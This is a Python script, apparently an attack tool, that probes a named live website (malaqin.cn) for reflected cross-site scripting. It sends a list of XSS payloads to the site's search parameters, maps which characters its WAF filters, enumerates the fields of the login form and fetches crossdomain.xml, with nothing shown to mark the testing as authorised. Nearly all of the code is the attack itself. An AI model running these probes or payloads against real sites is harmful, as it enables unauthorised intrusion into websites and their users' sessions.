import subprocess
import time

TARGET = "https://www.malaqin.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

def curl_get(path, timeout=12):
    url = TARGET + path
    cmd = ["curl", "-s", "-k", "-A", UA, "--compressed", "--max-time", str(timeout), url]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+5)
        return result.stdout if result.stdout else ""
    except:
        return ""

def main():
    print("=" * 70)
    print("  XSS 反射深度验证")
    print("=" * 70)

    # ============================================================
    print("\n[1] 验证搜索参数 kw 是否反射")
    print("-" * 60)
    
    marker = "xssreflector12345"
    
    # 测试1: index.php?m=search&kw=
    body = curl_get(f"/index.php?m=search&kw={marker}")
    if marker in body:
        print(f"  !! [确认] /index.php?m=search&kw={marker}")
        # 找到所有出现位置
        idx = 0
        count = 0
        while True:
            idx = body.find(marker, idx)
            if idx == -1:
                break
            count += 1
            context = body[max(0,idx-80):idx+len(marker)+80]
            print(f"  位置{count} (偏移{idx}):")
            print(f"    ...{context}...")
            print()
            idx += len(marker)
    else:
        print(f"  [未反射] /index.php?m=search&kw={marker}")
    
    # 测试2: /info/?kw=
    body2 = curl_get(f"/info/?kw={marker}")
    if marker in body2:
        print(f"  !! [确认] /info/?kw={marker}")
        idx = 0
        count = 0
        while True:
            idx = body2.find(marker, idx)
            if idx == -1:
                break
            count += 1
            context = body2[max(0,idx-80):idx+len(marker)+80]
            print(f"  位置{count} (偏移{idx}):")
            print(f"    ...{context}...")
            print()
            idx += len(marker)
    else:
        print(f"  [未反射] /info/?kw={marker}")

    # ============================================================
    print("\n[2] 构造实际XSS payload验证")
    print("-" * 60)
    
    xss_payloads = [
        # 闭合标签
        ("xssreflector12345\"><script>alert(1)</script>", "闭合双引号+script标签"),
        ("xssreflector12345'><script>alert(1)</script>", "闭合单引号+script标签"),
        ("xssreflector12345<script>alert(1)</script>", "直接script标签"),
        # 事件触发
        ("xssreflector12345\"+onmouseover=alert(1)+\"", "onmouseover事件"),
        ("xssreflector12345<img src=x onerror=alert(1)>", "img onerror"),
        # 编码
        ("xssreflector12345%22%3E%3Cscript%3Ealert(1)%3C/script%3E", "URL编码闭合"),
        # JavaScript上下文
        ("xssreflector12345\";alert(1);//", "JS上下文闭合"),
        ("xssreflector12345';alert(1);//", "JS单引号闭合"),
    ]
    
    for payload, label in xss_payloads:
        # 使用index.php?m=search
        body = curl_get(f"/index.php?m=search&kw={payload}")
        
        # 检查payload是否原样反射
        check_str = payload
        if "%22" in payload:
            check_str = payload.replace("%22", '"').replace("%3E", ">").replace("%3C", "<").replace("%3B", ";").replace("%2F", "/")
        
        found = False
        if "alert(1)" in body:
            found = True
            # 找到alert(1)的上下文
            idx = body.find("alert(1)")
            if idx != -1:
                context = body[max(0,idx-100):idx+50]
                print(f"  !! [反射] {label}")
                print(f"         上下文: ...{context}...")
        else:
            print(f"     [未反射] {label}")
        time.sleep(0.3)
    
    # ============================================================
    print("\n[3] 验证 /info/?kw= 的反射")
    print("-" * 60)
    
    for payload, label in xss_payloads[:3]:
        body = curl_get(f"/info/?kw={payload}")
        if "alert(1)" in body:
            idx = body.find("alert(1)")
            context = body[max(0,idx-100):idx+50]
            print(f"  !! [反射] /info/?kw= {label}")
            print(f"         上下文: ...{context}...")
        else:
            # 检查原始marker是否在
            if "xssreflector12345" in body:
                idx = body.find("xssreflector12345")
                context = body[max(0,idx-50):idx+100]
                print(f"  ** [部分反射] {label} - marker存在但payload被过滤")
                print(f"         上下文: ...{context}...")
            else:
                print(f"     [未反射] /info/?kw= {label}")
        time.sleep(0.3)

    # ============================================================
    print("\n[4] 检查WAF过滤规则 - 特殊字符测试")
    print("-" * 60)
    
    special_chars = [
        ("<", "小于号"),
        (">", "大于号"),
        ("\"", "双引号"),
        ("'", "单引号"),
        ("(", "左括号"),
        (")", "右括号"),
        (";", "分号"),
        ("//", "双斜杠"),
        ("/*", "注释开始"),
        ("script", "script关键字"),
        ("alert", "alert关键字"),
    ]
    
    for char, label in special_chars:
        # 使用URL编码
        import urllib.parse
        encoded = urllib.parse.quote(f"xsstest{char}marker", safe='')
        body = curl_get(f"/index.php?m=search&kw={encoded}")
        # 解码后检查
        decoded_char = char
        if decoded_char in body:
            idx = body.find(decoded_char)
            # 确保是搜索词中的，不是HTML本身的
            context = body[max(0,idx-30):idx+30]
            if "xsstest" in context or "marker" in context:
                print(f"  [通过] {label} ({char}) - 字符未被过滤")
            else:
                print(f"  [?] {label} ({char}) - 字符存在但上下文不确定")
        else:
            print(f"  [过滤] {label} ({char}) - 字符被过滤")
        time.sleep(0.2)

    # ============================================================
    print("\n[5] member/login 页面分析")
    print("-" * 60)
    
    body = curl_get("/member/login")
    if body:
        print(f"  页面大小: {len(body)}B")
        # 搜索表单
        import re
        forms = re.findall(r'<form[^>]*>.*?</form>', body, re.S | re.I)
        for i, form in enumerate(forms):
            print(f"\n  表单{i+1}:")
            action = re.findall(r'action=["\']([^"\']+)["\']', form, re.I)
            method = re.findall(r'method=["\']([^"\']+)["\']', form, re.I)
            inputs = re.findall(r'<input[^>]*>', form, re.I)
            print(f"    action: {action}")
            print(f"    method: {method}")
            for inp in inputs:
                name = re.findall(r'name=["\']([^"\']+)["\']', inp, re.I)
                type_ = re.findall(r'type=["\']([^"\']+)["\']', inp, re.I)
                print(f"    input: name={name} type={type_}")

    # ============================================================
    print("\n[6] crossdomain.xml 内容")
    print("-" * 60)
    body = curl_get("/crossdomain.xml")
    if body:
        print(body)

    print("\n验证完成。")

if __name__ == "__main__":
    main()
